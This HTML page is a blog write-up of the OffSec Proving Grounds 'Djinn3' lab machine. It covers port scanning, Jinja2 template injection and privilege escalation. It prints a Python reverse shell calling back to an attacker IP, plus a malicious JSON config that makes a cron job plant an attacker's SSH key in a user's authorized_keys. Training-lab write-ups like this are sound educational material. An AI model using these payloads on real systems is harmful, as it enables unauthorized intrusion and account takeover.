@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link href="https://fonts.googleapis.com/css?family=Merriweather:300|Raleway:400,700" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/style.css">
+<title>Proving grounds Play: Djinn3</title>
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Proving grounds Play: Djinn3 | Thevillagehacker’s Blog</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Proving grounds Play: Djinn3" />
+<meta name="author" content="Naveen" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Offsec proving grounds play linux machine writeup" />
+<meta property="og:description" content="Offsec proving grounds play linux machine writeup" />
+<link rel="canonical" href="http://localhost:4000/2023/07/29/Proving_grounds_Play-Djinn3.html" />
+<meta property="og:url" content="http://localhost:4000/2023/07/29/Proving_grounds_Play-Djinn3.html" />
+<meta property="og:site_name" content="Thevillagehacker’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-07-29T12:00:00+05:30" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Proving grounds Play: Djinn3" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Naveen"},"dateModified":"2023-07-29T12:00:00+05:30","datePublished":"2023-07-29T12:00:00+05:30","description":"Offsec proving grounds play linux machine writeup","headline":"Proving grounds Play: Djinn3","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2023/07/29/Proving_grounds_Play-Djinn3.html"},"url":"http://localhost:4000/2023/07/29/Proving_grounds_Play-Djinn3.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<script type="text/javascript" src="/assets/js/darkmode.js"></script>
+
+</head><body>
+  <main class="container">
+    <section class="about">
+      <div class="about-header condensed">
+      <div class="about-title">
+      <a href="/">
+        
+        <img src="/assets/portfolio.jpg" alt="Naveen Jagadeesan" />
+        
+      </a>
+      <h2 id="title">
+        <a href="/">Naveen Jagadeesan</a>
+      </h2>
+      </div><p class="tagline">Security Analyst. Security Researcher</p></div>
+      
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </section>
+    <section class="content">
+      <div class="post-container">
+  <a class="post-link" href="/2023/07/29/Proving_grounds_Play-Djinn3.html">
+    <h2 class="post-title">Proving grounds Play: Djinn3</h2>
+  </a>
+  <div class="post-meta">
+    <div class="post-date"><i class="icon-calendar"></i>Jul 29, 2023</div></div>
+  <div class="post">
+    <h2 id="nmap">NMAP</h2>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 e64423acb2d982e79058155e4023ed65 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 ae04856ecb104f554aad969ef2ce184f <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 f708561997b5031018667e7d2e0a4742 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp    open  http    lighttpd 1.4.45
+|_http-title: Custom-ers
+| http-methods: 
+|_  Supported Methods: OPTIONS GET HEAD POST
+|_http-server-header: lighttpd/1.4.45
+5000/tcp  open  http    Werkzeug httpd 1.0.1 <span class="o">(</span>Python 3.6.9<span class="o">)</span>
+|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
+31337/tcp open  Elite?
+</code></pre></div></div>
+
+<h2 id="fuzzing">Fuzzing</h2>
+<h3 id="files-port--80">Files: PORT : 80</h3>
+
+<p>No interesting files found.</p>
+
+<h3 id="files-port--5000">Files: PORT : 5000</h3>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Djinn3/port5000.png" alt="img" /></p>
+
+<p>Based on the nmap scan results the port 5000 is running with template engine, Sever Side Template Injection is possible to acheive.</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>5000/tcp  open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
+|_http-title: Site doesn't have a title (text/html; charset=utf-8).
+|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
+</code></pre></div></div>
+
+<p>In order to create tickets in the system the user has to connect to port <code class="language-plaintext highlighter-rouge">31337/tcp</code>.</p>
+
+<h2 id="connecting-to-port-31337tcp-as-guest">Connecting to PORT 31337/tcp as guest</h2>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Djinn3/port31337.png" alt="img" /></p>
+
+<h3 id="create-new-ticket-with-ssti-payload">Create New Ticket with SSTI Payload</h3>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Djinn3/SSTI.png" alt="img" /></p>
+
+<p>Server Side Template Injection Confirmed.</p>
+
+<h3 id="payload-to-list-filesdirectories-in-remote-server">Payload to list files/directories in remote server</h3>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Djinn3/jinja.png" alt="img" /></p>
+
+<p><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti">More Payloads</a></p>
+
+<h3 id="python-reverse-shell">Python reverse shell</h3>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">socket</span>
+<span class="kn">import</span> <span class="n">subprocess</span>
+<span class="kn">import</span> <span class="n">os</span>
+<span class="kn">import</span> <span class="n">pty</span>
+
+<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">);</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">"</span><span class="s">192.168.45.249</span><span class="sh">"</span><span class="p">,</span><span class="mi">1234</span><span class="p">));</span> <span class="n">os</span><span class="p">.</span><span class="nf">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">);</span>
+<span class="n">os</span><span class="p">.</span><span class="nf">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">);</span> <span class="n">os</span><span class="p">.</span><span class="nf">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">);</span>
+<span class="n">p</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="nf">call</span><span class="p">([</span><span class="sh">"</span><span class="s">/bin/bash</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">-i</span><span class="sh">"</span><span class="p">])</span>
+<span class="n">pty</span><span class="p">.</span><span class="nf">spawn</span><span class="p">(</span><span class="sh">"</span><span class="s">sh</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p><strong>Download reverse shell to the attacking machine</strong></p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Djinn3/revshell1.png" alt="img" /></p>
+
+<p><strong>HTTP Server Log to confirm download</strong></p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Djinn3/httplog.png" alt="img" /></p>
+
+<p><strong>Code Execution</strong></p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Djinn3/pyexec.png" alt="img" /></p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Djinn3/revshell2.png" alt="img" /></p>
+
+<p>Reverse Shell obtained.</p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<h3 id="users">Users</h3>
+
+<pre><code class="language-test">root:x:0:0:root:/root:/bin/bash
+saint:x:1000:1002:,,,:/home/saint:/bin/bash
+jack:x:1001:1003:,,,:/home/jack:/bin/bash
+mzfr:x:1002:1004:,,,:/home/mzfr:/bin/bash
+</code></pre>
+
+<p><strong>IO Operation in cron</strong></p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Djinn3/cron1.png" alt="img" /></p>
+
+<h3 id="download-and-decompile-the-pyc-files">Download and decompile the pyc files</h3>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Djinn3/pyc1.png" alt="img" /></p>
+
+<p><strong>Decompiled Code</strong></p>
+
+<p><strong>syncer.py</strong></p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Source Generated with Decompyle++
+# File: syncer.py (Python 3.8)
+</span>
+<span class="kn">from</span> <span class="n">configuration</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="n">connectors.ftpconn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="n">connectors.sshconn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="n">connectors.utils</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="sh">'''</span><span class="s">Main function
+    Cron job is going to make my work easy peasy
+    </span><span class="sh">'''</span>
+    <span class="n">configPath</span> <span class="o">=</span> <span class="n">ConfigReader</span><span class="p">.</span><span class="nf">set_config_path</span><span class="p">()</span>
+    <span class="n">config</span> <span class="o">=</span> <span class="n">ConfigReader</span><span class="p">.</span><span class="nf">read_config</span><span class="p">(</span><span class="n">configPath</span><span class="p">)</span>
+    <span class="n">connections</span> <span class="o">=</span> <span class="nf">checker</span><span class="p">(</span><span class="n">config</span><span class="p">)</span>
+    <span class="k">if</span> <span class="sh">'</span><span class="s">FTP</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">connections</span><span class="p">:</span>
+        <span class="nf">ftpcon</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">FTP</span><span class="sh">'</span><span class="p">])</span>
+    <span class="k">elif</span> <span class="sh">'</span><span class="s">SSH</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">connections</span><span class="p">:</span>
+        <span class="nf">sshcon</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">SSH</span><span class="sh">'</span><span class="p">])</span>
+    <span class="k">elif</span> <span class="sh">'</span><span class="s">URL</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">connections</span><span class="p">:</span>
+        <span class="nf">sync</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">URL</span><span class="sh">'</span><span class="p">],</span> <span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">Output</span><span class="sh">'</span><span class="p">])</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
+    <span class="nf">main</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Output can be written to a file in the attacking machine: meaning we could write our own ssh key to attacking machine as authorized_keys.</p>
+
+<p><strong>config.py</strong></p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Source Generated with Decompyle++
+# File: config.py (Python 3.8)
+</span>
+<span class="kn">import</span> <span class="n">os</span>
+<span class="kn">import</span> <span class="n">sys</span>
+<span class="kn">import</span> <span class="n">json</span>
+<span class="kn">from</span> <span class="n">glob</span> <span class="kn">import</span> <span class="n">glob</span>
+<span class="kn">from</span> <span class="n">datetime</span> <span class="kn">import</span> <span class="n">datetime</span> <span class="k">as</span> <span class="n">dt</span>
+
+<span class="k">class</span> <span class="nc">ConfigReader</span><span class="p">:</span>
+    <span class="n">config</span> <span class="o">=</span> <span class="bp">None</span>
+    
+    <span class="k">def</span> <span class="nf">read_config</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
+<span class="n">Unsupported</span> <span class="n">opcode</span><span class="p">:</span> <span class="n">BEGIN_FINALLY</span>
+        <span class="sh">'''</span><span class="s">Reads the config file
+        </span><span class="sh">'''</span>
+        <span class="n">config_values</span> <span class="o">=</span> <span class="p">{</span> <span class="p">}</span>
+    <span class="c1"># WARNING: Decompyle incomplete
+</span>
+    <span class="n">read_config</span> <span class="o">=</span> <span class="nf">staticmethod</span><span class="p">(</span><span class="n">read_config</span><span class="p">)</span>
+    
+    <span class="k">def</span> <span class="nf">set_config_path</span><span class="p">():</span>
+        <span class="sh">'''</span><span class="s">Set the config path
+        </span><span class="sh">'''</span>
+        <span class="n">files</span> <span class="o">=</span> <span class="nf">glob</span><span class="p">(</span><span class="sh">'</span><span class="s">/home/saint/*.json</span><span class="sh">'</span><span class="p">)</span>
+        <span class="n">other_files</span> <span class="o">=</span> <span class="nf">glob</span><span class="p">(</span><span class="sh">'</span><span class="s">/tmp/*.json</span><span class="sh">'</span><span class="p">)</span>
+        <span class="n">files</span> <span class="o">=</span> <span class="n">files</span> <span class="o">+</span> <span class="n">other_files</span>
+        
+        <span class="k">try</span><span class="p">:</span>
+            <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">files</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">:</span>
+                <span class="n">files</span> <span class="o">=</span> <span class="n">files</span><span class="p">[:</span><span class="mi">2</span><span class="p">]</span>
+            <span class="n">file1</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">basename</span><span class="p">(</span><span class="n">files</span><span class="p">[</span><span class="mi">0</span><span class="p">]).</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">.</span><span class="sh">'</span><span class="p">)</span>
+            <span class="n">file2</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">basename</span><span class="p">(</span><span class="n">files</span><span class="p">[</span><span class="mi">1</span><span class="p">]).</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">.</span><span class="sh">'</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">file1</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="sh">'</span><span class="s">config</span><span class="sh">'</span> <span class="ow">and</span> <span class="n">file2</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="sh">'</span><span class="s">config</span><span class="sh">'</span><span class="p">:</span>
+                <span class="n">a</span> <span class="o">=</span> <span class="n">dt</span><span class="p">.</span><span class="nf">strptime</span><span class="p">(</span><span class="n">file1</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="sh">'</span><span class="s">%d-%m-%Y</span><span class="sh">'</span><span class="p">)</span>
+                <span class="n">b</span> <span class="o">=</span> <span class="n">dt</span><span class="p">.</span><span class="nf">strptime</span><span class="p">(</span><span class="n">file2</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="sh">'</span><span class="s">%d-%m-%Y</span><span class="sh">'</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">b</span> <span class="o">&lt;</span> <span class="n">a</span><span class="p">:</span>
+                <span class="n">filename</span> <span class="o">=</span> <span class="n">files</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">filename</span> <span class="o">=</span> <span class="n">files</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+        <span class="k">finally</span><span class="p">:</span>
+            <span class="k">pass</span>
+        <span class="k">except</span> <span class="nb">Exception</span><span class="p">:</span>
+            <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        
+
+        <span class="k">return</span> <span class="n">filename</span>
+
+    <span class="n">set_config_path</span> <span class="o">=</span> <span class="nf">staticmethod</span><span class="p">(</span><span class="n">set_config_path</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Create malicious json file and move the file to <code class="language-plaintext highlighter-rouge">/tmp</code> folder in the attacking machine.</p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<h3 id="malicious-json-file-creation">Malicious json file creation</h3>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+</span><span class="nl">"URL"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"http://192.168.45.190:8000/authorized_keys"</span><span class="p">,</span><span class="w">
+</span><span class="nl">"Output"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"/home/saint/.ssh/authorized_keys"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Copy the json file to <code class="language-plaintext highlighter-rouge">/tmp</code> folder in the attacking machine and wait for the syncer to read and write our authorized SSH key to saint user <code class="language-plaintext highlighter-rouge">.ssh</code> folder.</p>
+
+<p><strong>authorized_keys overwritten</strong></p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Djinn3/authz_key.png" alt="img" /></p>
+
+<p>Successfully logged into user <code class="language-plaintext highlighter-rouge">saint</code>.</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Djinn3/saint.png" alt="img" /></p>
+
+<p>User <code class="language-plaintext highlighter-rouge">saint</code> has the ability to add an user as super user. As shown in the below screenshot the root user already exists in the system, so we are adding a new user to the root user group.</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Djinn3/adduser.png" alt="img" /></p>
+
+<p>The user <code class="language-plaintext highlighter-rouge">nj</code> doesn’t has the persmission to execute anything in the machine djinn3.</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Djinn3/nj_sudo_l.png" alt="img" /></p>
+
+<p>Upon checking the <code class="language-plaintext highlighter-rouge">/etc/sudoers</code> file found a hidden user. The administrator forgot to remove <code class="language-plaintext highlighter-rouge">jason</code> from the sudoers file.</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Djinn3/new_user.png" alt="img" /></p>
+
+<p>Adding <code class="language-plaintext highlighter-rouge">jason</code> as new user to get root access.</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Djinn3/add_jason.png" alt="img" /></p>
+
+<p>Listing jason user permissions.</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Djinn3/jason_l.png" alt="img" /></p>
+
+<p>jason can run <code class="language-plaintext highlighter-rouge">apt-get</code>.</p>
+
+<p><strong>Search for exploit in GTFO Bins</strong></p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Djinn3/gtfo.png" alt="img" /></p>
+
+<p><strong>Running Exploit</strong></p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Djinn3/root.png" alt="img" /></p>
+
+<p>Root obtained.</p>
+
+<p>Thanks for reading!</p>
+
+<p>For more insights and updates, follow me on Twitter: <a href="https://twitter.com/thevillagehackr">@thevillagehacker</a>.</p>
+
+  </div></div>
+
+    </section>
+    <footer class="condensed">
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </footer>
+  </main>
+  
+  <script type="text/javascript" src="/assets/js/darkmode.js"></script>
+  
+  <script src="/assets/js/simple-jekyll-search.min.js"></script>
+  <script src="/assets/js/search.js"></script>
+  
+</body>
+
+</html>
